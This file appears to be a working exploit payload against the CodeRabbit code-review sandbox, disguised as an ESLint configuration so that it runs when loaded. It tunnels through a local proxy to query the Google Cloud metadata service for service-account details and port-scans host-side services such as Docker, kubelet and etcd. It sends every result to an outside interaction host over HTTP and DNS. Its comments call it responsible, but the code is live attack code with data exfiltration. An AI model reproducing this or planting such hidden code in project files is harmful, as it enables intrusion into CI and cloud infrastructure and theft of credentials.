// CodeRabbit RCE — proxy CONNECT-tunnel pivot (UNTESTED path).
// GET forward-proxying forced :443; CONNECT takes an explicit host:port and opens a raw
// tunnel on the PROXY's network — can reach metadata:80 + host-localhost the sandbox can't.
// Responsible: fetches SA email/scopes (identifiers), NOT the access token value.
var C = 'd8smlqboeaqna18ht8k03zdmsky9yr8b4.oast.live';
var http = require('http'), dns = require('dns'), net = require('net');
var hex = function (s) { return Buffer.from(String(s)).toString('hex'); };
var httpX = function (t, d) { try { http.get({ host: C, path: '/' + t + '/' + hex(String(d)).slice(0, 1500), timeout: 8000 }, function () {}).on('error', function () {}); } catch (e) {} };
try { dns.lookup('alive10.' + C, function () {}); } catch (e) {}

// CONNECT to host:port via the proxy; if a tunnel opens and getPath is set, send a plain GET over it.
var connectTest = function (host, port, tag, getPath, getHost) {
  try {
    var s = net.connect({ host: '127.0.0.1', port: 1080, timeout: 6000 });
    var buf = '', tunneled = false;
    s.on('connect', function () { s.write('CONNECT ' + host + ':' + port + ' HTTP/1.1\r\nHost: ' + host + ':' + port + '\r\n\r\n'); });
    s.on('data', function (d) {
      buf += d.toString('latin1');
      if (!tunneled && /\r\n\r\n/.test(buf)) {
        tunneled = true;
        var status = buf.split('\r\n')[0];
        if (/ 200 /.test(status) && getPath) {
          httpX(tag, 'CONNECT_OK ' + status);
          buf = '';
          s.write('GET ' + getPath + ' HTTP/1.1\r\nHost: ' + (getHost || host) + '\r\nMetadata-Flavor: Google\r\nConnection: close\r\n\r\n');
        } else {
          httpX(tag, buf.slice(0, 250)); try { s.destroy(); } catch (e) {}
        }
      } else if (tunneled && buf.length > 120) { httpX(tag, 'RESP ' + buf.slice(0, 280)); try { s.destroy(); } catch (e) {} }
    });
    s.on('error', function (e) { httpX(tag, 'ERR:' + ((e && e.code) || e)); });
    s.on('timeout', function () { httpX(tag, 'TIMEOUT:' + buf.slice(0, 120)); try { s.destroy(); } catch (e) {} });
  } catch (e) { httpX(tag, 'EXC'); }
};

// metadata via CONNECT on :80 (the path GET could not take) — fetch SA email/scopes, not the token
connectTest('169.254.169.254', 80, 'md80', '/computeMetadata/v1/instance/service-accounts/default/email', 'metadata.google.internal');
connectTest('metadata.google.internal', 80, 'mdhost', '/computeMetadata/v1/instance/service-accounts/default/scopes', 'metadata.google.internal');
connectTest('169.254.169.254', 443, 'md443', null);

// host-side localhost services reachable from the proxy's netns (microVM root / runner / control plane)
[1080, 8080, 8000, 9229, 2375, 2376, 6443, 10250, 50051, 8888, 80, 443, 9090, 3000, 5000, 2379, 6060, 7000].forEach(function (p) {
  connectTest('127.0.0.1', p, 'hp_' + p, null);
});
// host-side gateways
['169.254.1.254', '169.254.169.126', '169.254.1.1'].forEach(function (ip) { connectTest(ip, 80, 'gw_' + ip.replace(/\./g, '_'), null); });

module.exports = { root: true, rules: {} };
